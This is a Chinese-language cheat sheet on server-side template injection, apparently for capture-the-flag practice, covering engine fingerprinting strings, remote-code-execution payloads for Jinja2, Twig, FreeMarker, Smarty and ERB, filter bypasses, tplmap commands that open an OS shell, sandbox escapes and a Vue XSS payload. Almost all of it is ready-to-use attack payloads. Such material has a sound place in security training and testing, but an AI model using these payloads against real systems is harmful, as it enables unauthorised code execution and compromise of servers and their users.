# SSTI（服务端模板注入）

## 探测

```
{{7*7}}        → 49（绝大多数模板）
${7*7}         → 49（部分 Java 模板）
{{7*'7'}}      → 7777777（Jinja2）/ 49（Twig）
<%= 7*7 %>     → ERB
#{7*7}         → Slim/Pug
```

## 模板识别

| 输入 | 输出 | 模板 |
|---|---|---|
| `{{7*'7'}}` | `7777777` | Jinja2 |
| `{{7*'7'}}` | `49` | Twig |
| `${7*7}` | `49` | FreeMarker / Velocity / Spring EL |
| `<%= 7*7 %>` | `49` | ERB (Ruby) |
| `#{7*7}` | `49` | Slim / Pug |
| `{7*7}` | `49` | Smarty |

## 利用 payload

### Jinja2 / Flask

```
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
{{ ''.__class__.__mro__[1].__subclasses__()[<idx>](...) }}
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
{{ get_flashed_messages.__globals__['__builtins__']['__import__']('os').popen('id').read() }}
```

绕过过滤：
- `__class__` 被禁 → `{{(()|attr('\x5f\x5fclass\x5f\x5f'))}}`
- `request` 取参：`{{ request.args.x }}` 让 x 携带敏感字符
- `lipsum.__globals__['os'].popen('id').read()`

### Twig (PHP)

```
{{ ['id']|filter('system') }}
{{ _self.env.registerUndefinedFilterCallback("exec") }}{{ _self.env.getFilter("id") }}
```

### FreeMarker (Java)

```
<#assign value="freemarker.template.utility.Execute"?new()>${value("id")}
```

### Smarty

```
{php}system('id');{/php}     # 老版本
{system('id')}               # 直接函数
```

### ERB (Ruby)

```
<%= `id` %>
<%= system("id") %>
```

## Tplmap

```bash
tplmap -u 'http://target/?name=test'
tplmap -u 'http://target/?name=test' --os-shell
```

## 上下文测试

很多 SSTI 题题面是个搜索框 / 个人介绍 / 自定义模板：
1. 先确认输入回显在响应中
2. 试 `{{7*7}}` 看是否被求值（`49`）还是字面量
3. 试 `{{config}}` `{{request}}` `{{self}}` 看模板上下文
4. 选对应语言的最短 RCE payload

## 沙箱逃逸

- Flask sandbox：`__class__.__mro__[-1].__subclasses__()` 找 `subprocess.Popen`
- Twig sandbox：`getEnvironment().getFilter("system")`
- Vue 模板（前端 XSS）：`{{constructor.constructor('alert(1)')()}}`
